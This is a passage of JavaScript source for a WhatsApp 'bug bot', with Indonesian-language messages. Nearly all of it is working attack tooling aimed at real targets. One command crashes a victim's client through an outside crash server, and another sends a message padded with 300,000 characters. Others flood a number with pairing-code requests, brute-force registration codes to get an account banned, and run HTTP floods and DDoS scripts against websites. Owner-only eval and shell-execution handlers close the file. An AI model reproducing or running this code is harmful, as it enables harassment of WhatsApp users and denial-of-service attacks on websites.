await replysyxn(`ALL BUG HAS SENT TO ${Target}`)
break
case 'crash':
  if (!isCreator) return replysyxn('ONLY FOR OWNER')
if (!q) return reply('Example 62xxx')
let NomorTarget = q.replace(/[^0-9]/g, "")
let Warek = NomorTarget + '@s.whatsapp.net'

async function kirCrash(X) {
			try {
				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + Warek);
				console.log(chalk.green("Bug Sending By AlwaysKris X Bug🇮🇩〽️"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
	await kirCrash(Warek)
	await kirCrash(Warek)
	await kirCrash(Warek)
	break
	case 'tedex':
	if (!isCreator) return replysyxn('ONLY FOR OWNER')
if (!q) return reply('Example 62xxx')
let Nomor1Target = q.replace(/[^0-9]/g, "")
let Warekk = Nomor1Target + '@s.whatsapp.net'
const ngentd = "AlwaysKris" + "ꦾ".repeat(300000)

async function sendTedex(X, QTD) {
			await client.relayMessage(Warekk, {
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'locationMessage': {},
								'hasMediaAttachment': true
							},
							'body': {
								'text': ngentd
							},
							'nativeFlowMessage': {
								'messageParamsJson': 'mala'
							},
							'carouselMessage': {}
						}
					}
				}
			}, {
				participant: {
					jid: Warekk
				}
			});
			await client.sendMessage(X, {
				text: 'AlwaysKris X Bug💀'
			}, {
				quoted: alwkris
			});
			console.log(chalk.green("Bug Sending By KrisTzy x bug〽️"));
		};
		await sendTedex(Warekk)
		await sendTedex(Warekk)
		await sendTedex(Warekk)
		await sendTedex(Warekk)
		break
		case 'spampair': {
				if (!isCreator) return replysyxn('Only For Owner')
				if (!q) return replysyxn(`*Format Salah!*\n\nUse : Spampair NUMBER|AMOUNT\nExample : Spampair 62xx\nAlwaysKris X Bug 〽️`)
				let [peenis, pepekk = "50"] = q.split("|")
				let target = peenis.replace(/[^0-9]/g, '').trim()
				await replysyxn(`</> Succes Spam Pairing To ${target}〽️`)
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require('@whiskeysockets/baileys')
				let {
					state
				} = await useMultiFileAuthState('ALWAYSKRIS')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let sucked = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await sucked.requestPairingCode(target)
					await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
			break
			case 'tempban': {
				if (!isCreator) return replysyxn(mess.owner)
				if (args.length < 1) return replysyxn(`*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝐀𝐦͢𝐛ͯ𝐚͢𝐓ͯ𝐳͢𝐲 〽️`);
				const args2 = args[0].split('|');
				if (args2.length !== 2) return replysyxn(`Gunakan : Tempban ID|NO\n <✓> Contoh: Tempban 62|819\n> 💀⃟༑⌁⃰𝐈͢𝐍ͯ𝐅𝐈𝐍͢𝐈𝐓𝐘 𝐓ͯ𝐄͢𝐌ͯ𝐏 𝐁ͯ𝐀𝐍 𝐁𝐘 𝐀𝐋𝐖͢𝐀𝐘ͯ𝐒𝐊𝐑͢𝐈𝐒ཀ͜͡〽️`);
				const AlwaysKrisCountryCode = args2[0];
				const Ttarget = args2[1];
				const AlwaysKrisNumber = Ttarget.replace('@s.whatsapp.net', '');
				const AlwaysKrismerge = `${AlwaysKrisCountryCode}${Ttarget}`
				const AlwaysKrisMention = AlwaysKrismerge + '@s.whatsapp.net';
				await replysyxn(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
				try {
					const {
						stateAlwaysKris,
						saveCredsAlwaysKris
					} = await useMultiFileAuthState('./AlwaysKris');
					const AlwaysKrisRequest = await AlwaysKris.requestRegistrationCode({
						phoneNumber: '+' + AlwaysKrisCountryCode + `${AlwaysKrisNumber}`,
						phoneNumberCountryCode: AlwaysKrisCountryCode,
						phoneNumberNationalNumber: `${AlwaysKrisNumber}`,
						phoneNumberMobileCountryCode: 724,
						method: 'sms'
					});
				} catch (err) {}

				for (let i = 0; i < 10000; i++) {
					try {
						var AlwaysKrisPrefix = Math.floor(Math.random() * 999);
						var AlwaysKrisSuffix = Math.floor(Math.random() * 999);
						await AlwaysKris.register(`${AlwaysKrisPrefix}-${AlwaysKrisSuffix}`);
					} catch (err) {
						console.log(`${AlwaysKrisPrefix}-${AlwaysKrisSuffix}`);
					}
				}
			}
			break
			//DDOS WEBSITE\\
			//=================================================//
			case 'dos': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1] * 1000
				if (args.length === 2 && url && !isNaN(time)) {
					let attack = () => {
						let totalRequests = 0
						let threads = []
						for (let j = 0; j < 6; j++) {
							threads.push(
								new Promise((resolve, reject) => {
									let interval = setInterval(() => {
										for (let j = 0; j < 100; j++) {
											fetch(url)
												.then(() => {
													totalRequests++
													console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
												})
												.catch(err => {})
										}
									}, 750)
									setTimeout(() => {
										clearInterval(interval)
										resolve()
									}, time)
								})
							)
						}

						Promise.all(threads)
							.then(() => console.log("Attack Complete"))
							.catch(err => console.error("Error In Attack:", err))
					}

					attack()
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format: Dos [Url] [Time]`)
				}
			}
			break
			case 'ddos': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'xc': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let [url, time, rate, thread, proxyFile] = q.split(" ");
				if (args.length === 5 && url && time && rate && thread && proxyFile) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/LC.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString());
						if (stdout) return console.log(util.format(stdout));
					});
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]`);
				}
			}
			break
			case 'mix': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'floods': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'ua': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'xchrome': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tls': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tlsbypass': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tlsv2': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'bypass-cf': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tls-vip': {
				if (!isCreator) return replysyxn('Lu siapa?')
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					replysyxn(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju\n> Link: ${url} 🎭\n> Time: ${time} Detik.`);
					exec(`node ./system/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					replysyxn(`Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			//END DDOS\\
			
			case '/tesbut':
                // Kirim pesan dengan button
                const buttons = [
                    { buttonId: 'id1', buttonText: { displayText: 'Info Bot' }, type: 1 },
                    { buttonId: 'id2', buttonText: { displayText: 'Help' }, type: 1 },
                    { buttonId: 'id3', buttonText: { displayText: 'Donate' }, type: 1 }
                ];

                const buttonMessage = {
                    text: "Selamat datang di Bot WhatsApp! Pilih opsi di bawah ini:",
                    footer: "Bot by AlwaysKris",
                    buttons: buttons,
                    headerType: 1
                };

                await sock.sendMessage(from, buttonMessage);
                break;

            case 'id1':
                await sock.sendMessage(from, { text: 'Ini adalah bot WhatsApp menggunakan Baileys.' });
                break;

            case 'id2':
                await sock.sendMessage(from, { text: 'Ketik /help untuk melihat perintah yang tersedia.' });
                break;

            case 'id3':
                await sock.sendMessage(from, { text: 'Terima kasih atas donasinya! 😊' });
                break;
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply('ONLY OWNER')

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply('ONLY OWNER')
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply('ONLY OWNER')
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})